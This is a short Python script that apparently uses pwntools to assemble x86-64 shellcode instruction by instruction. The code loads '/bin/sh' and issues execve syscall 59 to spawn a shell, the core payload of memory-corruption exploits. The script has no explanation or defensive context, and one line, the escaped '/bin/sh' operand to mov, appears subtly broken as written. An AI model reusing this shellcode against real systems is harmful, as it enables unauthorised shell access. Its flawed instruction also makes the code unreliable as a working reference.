from pwn import * 

print(asm("xor esi, esi"))
print(asm("mul esi"))
print(asm("xor edi, edi"))
print(asm("mov rdi, \x2f\x62\x69\x6e\x2f\x73\x68"))
print(asm("push rdi"))
print(asm("push rsp"))
print(asm("pop rdi"))
print(asm("add al, 59"))
print(asm("syscall"))